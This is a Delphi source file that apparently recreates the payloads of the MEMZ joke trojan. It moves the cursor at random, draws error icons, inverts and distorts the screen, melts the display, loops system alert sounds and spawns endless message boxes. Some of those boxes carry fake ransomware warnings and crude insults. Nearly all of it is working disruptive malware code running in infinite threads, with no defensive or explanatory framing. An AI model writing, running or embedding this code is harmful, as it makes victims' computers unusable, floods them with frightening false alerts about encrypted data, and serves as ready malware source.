program MEMZPayloads;

uses
  Windows, Math, Graphics, MMSystem, Dialogs, Forms;


//PayloadCursor
procedure PayloadCursor;
var
  Point: TPoint;
begin
  while true do begin
    Sleep(10);
    GetCursorPos(Point);
    SetCursorPos(Point.X + RandomRange(-1,2), Point.Y + RandomRange(-1,2));
  end;
end;
//PayloadCursor


//PayloadDrawErrors
procedure PayloadDrawErrors;
const
  IDI: array[0..2] of PAnsiChar = (IDI_ERROR, IDI_WARNING, IDI_QUESTION);
var
  Point: TPoint;
begin
  while true do begin
    GetCursorPos(Point);
    DrawIcon(GetDC(0), Point.X-16, Point.Y-16, LoadIcon(0, IDI[Random(Length(IDI))]));
    Sleep(20);
  end;
end;
//PayloadDrawErrors


//PayloadInvert
procedure PayloadInvert;
begin
  while true do begin
    Sleep(1000);
    BitBlt(GetDC(0), 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), GetDC(0), 0, 0, NOTSRCCOPY);
  end;
end;
//PayloadInvert


//PayloadMessageBox
procedure PayloadMessageBox;
const
  msg: array [0..25] of String = ('wtf are going on!',
                                  'go to sleep',
                                  'LOOK AT THIS DUDE',
                                  'Enderman is pidoras',
                                  'HACKER! ENJOY BAN!',
                                  'HAHA N00B L2P G3T R3KT',
                                  'REST IN PISS, FOREVER MISS.',
                                  'GET BETTER HAX NEXT TIME xD',
                                  'Uh, Club Penguin. Time to get banned!',
                                  'You are an idiot!',
                                  'Have you tried turning it off and on again?',
                                  'HAVE FUN TRYING TO RESTORE YOUR DATA :D',
                                  'Drugs are bad!',
                                  'Get out of my room!',
                                  'You become victim of the PETYA RANSOMWARE!',
                                  'Oops your files are encrypted',
                                  'OoOooOOo, what it is motherfuckers!',
                                  'here comes Packman',
                                  'want a free weed?',
                                  'puuusies',
                                  'U WOT M8!',
                                  'SUCC',
                                  'totally not malware',
                                  'Yuki!?',
                                  'I am watching you',
                                  'OPEN THE DOORS, IT IS FBR!');
var
  id: LongWord;
begin
  Sleep(1000);
  BeginThread(nil, 0, Addr(PayloadMessageBox), nil, 0, id);
  with CreateMessageDialog(msg[Random(Length(msg))], mtCustom, [mbOK]) do begin
    Top := Random(GetSystemMetrics(SM_CYSCREEN));
    Left := Random(GetSystemMetrics(SM_CXSCREEN));
    Caption := 'PayloadMessageBox';
    ShowModal;
  end;
  EndThread(0);
end;
//PayloadMessageBox


//PayloadScreenGlitches
procedure PayloadScreenGlitches;
begin
  while true do begin
    Sleep(500);
    BitBlt(GetDC(0), Random(GetSystemMetrics(SM_CXSCREEN) - 400), Random(GetSystemMetrics(SM_CYSCREEN) - 400), Random(400), Random(400), GetDC(0), Random(GetSystemMetrics(SM_CXSCREEN) - 400), Random(GetSystemMetrics(SM_CYSCREEN) - 400), SRCCOPY);
  end;
end;
//PayloadScreenGlitches


//PayloadScreenMelter
procedure PayloadScreenMelter;
var
  X, Y: Integer;
  ScreenWidth, ScreenHeight: Integer;
  Window: HDC;
  nWnd: HWND;
begin
  ScreenWidth := GetSystemMetrics(SM_CXSCREEN);
  ScreenHeight := GetSystemMetrics(SM_CYSCREEN);
  nWnd := CreateWindowExA(WS_EX_TOPMOST, 'ScreenMelter', nil, WS_POPUP,0, 0, ScreenWidth, ScreenHeight, HWND_DESKTOP, 0, 0, nil);

  while true do begin
    Window := GetDC(nWnd);
    X := Random(ScreenWidth) - 75;
    Y := Random(15);
    BitBlt(Window, X, Y, Random(150), ScreenHeight, Window, X, 0, SRCCOPY);
    ReleaseDC(nWnd, Window);
  end;
end;
//PayloadScreenMelter


//PayloadSound
procedure PayloadSound;
const
  Sound: array[0..2] of String = ('SystemHand', 'SystemQuestion', 'SystemExclamation');
begin
  while true do PlaySound(PChar(Sound[Random(Length(sound))]), 0, SND_SYNC);
end;
//PayloadSound


//PayloadTunnel
procedure PayloadTunnel();
begin
  while true do begin
    Sleep(3000);
    StretchBlt(GetDC(0), 50, 50, GetSystemMetrics(SM_CXSCREEN) - 100, GetSystemMetrics(SM_CYSCREEN) - 100, GetDC(0), 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), SRCCOPY);
  end;
end;
//PayloadTunnel


var
  id: LongWord;
begin
  Randomize;
  BeginThread(nil, 0, Addr(PayloadCursor), nil, 0, id);
  BeginThread(nil, 0, Addr(PayloadDrawErrors), nil, 0, id);
  BeginThread(nil, 0, Addr(PayloadInvert), nil, 0, id);
  BeginThread(nil, 0, Addr(PayloadMessageBox), nil, 0, id);
  BeginThread(nil, 0, Addr(PayloadScreenGlitches), nil, 0, id);
  BeginThread(nil, 0, Addr(PayloadScreenMelter), nil, 0, id);
  BeginThread(nil, 0, Addr(PayloadSound), nil, 0, id);
  BeginThread(nil, 0, Addr(PayloadTunnel), nil, 0, id);
  while true do Application.ProcessMessages;
end.